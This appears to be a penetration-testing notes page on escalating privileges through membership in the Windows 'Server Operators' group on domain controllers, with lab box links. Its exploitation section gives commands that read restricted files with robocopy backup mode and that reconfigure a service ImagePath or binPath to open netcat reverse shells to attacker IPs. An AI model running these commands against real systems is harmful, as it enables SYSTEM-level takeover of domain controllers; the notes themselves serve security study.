---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# Server Operators

## Information

Server Operators exists only on DCs and are used for managing the DC as a whole, including service configurations and files. They can create and delete network shared resources, **start and stop services**, **back up and restore files**, and **change installed binaries** on the DCs. This group is considered a **service administrator** account because its members have physical access to DCs.

> Well-known SID/RID: `S-1-5-32-549`.

<table><thead><tr><th width="221">Privileges</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/back-up-files-and-directories">SeBackupPrivilege</a></td><td>Allows us to create backups of any files, whilst not restoring their permissions, which equals to <strong>arbitrary read access</strong>.</td></tr><tr><td><a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/restore-files-and-directories">SeRestorePrivilege</a></td><td>Allows us to <strong>overwrite legitimate executable files</strong> with versions that include malicious software used for <strong>privilege escalation</strong>.</td></tr></tbody></table>

## Exploitation

### Accessing Files

<pre class="language-powershell"><code class="lang-powershell"><strong># copy "restricted" data
</strong><strong>robocopy /b C:\users\administrator\desktop C:\programdata\temp
</strong></code></pre>

### ImagePath

Member of this group has the ability to manage services. By modifying the `ImagePath` of a service we can gain `SYSTEM` level access. An example of this process can be found [here](../../../../boxes/boxes/insane/multimaster.md#changing-paths).

{% code overflow="wrap" %}
```powershell
# change ImagePath
reg add "HKLM\System\CurrentControlSet\services\wuauserv" /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\System32\spool\drivers\color\nc64.exe -e powershell.exe 10.10.14.6 1337" /f
# confirm change
reg query "HKLM\System\CurrentControlSet\services\wuauserv"
# start service
Start-Service wuauserv
```
{% endcode %}

### binPath

Similar to [`ImagePath`](server-operators.md#imagepath), we can change the `binPath`.

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong># change binPath
</strong><strong>sc.exe config browser binPath= "C:\programdata\nc64.exe -e cmd.exe 10.10.14.19 443"
</strong><strong># stop the service
</strong>sc.exe stop browser
# start the service
sc.exe start browser
</code></pre>

## Resources

{% tabs %}
{% tab title="First Tab" %}
{% embed url="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators" %}
{% endtab %}

{% tab title="Exploitation" %}
{% embed url="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/" %}
{% endtab %}
{% endtabs %}

## Boxes

{% tabs %}
{% tab title="Sizzle" %}
{% embed url="https://x7331.gitbook.io/boxes/boxes/boxes/insane/sizzle" %}
{% endtab %}

{% tab title="Second Tab" %}

{% endtab %}
{% endtabs %}
